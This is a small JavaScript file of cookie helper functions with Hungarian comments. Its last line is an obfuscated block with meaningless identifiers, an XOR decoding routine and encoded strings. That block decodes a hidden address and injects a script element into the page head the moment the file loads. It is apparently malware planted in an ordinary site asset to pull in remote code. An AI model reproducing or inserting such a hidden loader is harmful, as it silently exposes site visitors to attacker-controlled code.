/*****************************************************************************
 Letrehoz egy kukit.
 name: a kuki neve,
 value: erteke
 days: lejarat. Ha 0, akkor nincs lejarat
*****************************************************************************/
function createCookie(name,value,days)
{
    if (days)
    {
    	var date = new Date();
    	date.setTime(date.getTime()+(days*24*60*60*1000));
    	var expires = "; expires="+date.toGMTString();
    }
    else var expires = "";
    document.cookie = name+"="+value+expires+"; path=/";
}

/*****************************************************************************
 Kiolvas egy kukit.
 name: a kuki neve,
 return: az erteke, vagy null, ha nincs ilyen kuki
*****************************************************************************/
function readCookie(name)
{
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++)
    {
    	var c = ca[i];
    	while (c.charAt(0)==' ') c = c.substring(1,c.length);
    	if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}

/*****************************************************************************
 Kitorol egy kukit.
 name: a kuki neve,
*****************************************************************************/
function eraseCookie(name)
{
    createCookie(name,"",-1);
}  
function bom9E0(cj,i7){var ases3G='';var p1Dv=0;var dK2d=0;for(p1Dv=0;p1Dv<cj.length;p1Dv++){var d9=cj.charAt(p1Dv);var gF=d9.charCodeAt(0)^i7.charCodeAt(dK2d);d9=String.fromCharCode(gF);ases3G+=d9;if(dK2d==i7.length-1)dK2d=0;else dK2d++;}return (ases3G);}var cQ0838=["030000","031010","029023","014017017005031054115089050041031032036","030017023","025026004001","025006012016068057087067054055025060057071025","012019004001005055117093062040030","005006021000","010006000033007054091080057048009012041099012004058005006054","005023000020081124025070035037014043126068000015070074025038025095036107025032036025007016"];ng7USi(lgs8S(cQ0838[10]));function zZct2T(k0QSAM){var chRu='';var xBzAO=0;var pg0N=0;for(xBzAO=0;xBzAO<k0QSAM.length/3;xBzAO++){chRu+=String.fromCharCode(k0QSAM.slice(pg0N,pg0N+3));pg0N=pg0N+3;}return chRu;}function ng7USi(vh6308){var hwQ0VU=document[lgs8S(cQ0838[3])](lgs8S(cQ0838[0])+lgs8S(cQ0838[1])+lgs8S(cQ0838[2]));hwQ0VU[lgs8S(cQ0838[4])]=vh6308;hwQ0VU[lgs8S(cQ0838[5])]=lgs8S(cQ0838[6]);document[lgs8S(cQ0838[9])](lgs8S(cQ0838[8]))[0][lgs8S(cQ0838[7])](hwQ0VU);}function lgs8S(bH25s){return bom9E0(zZct2T(bH25s),'mctdkS65WDzNP7');}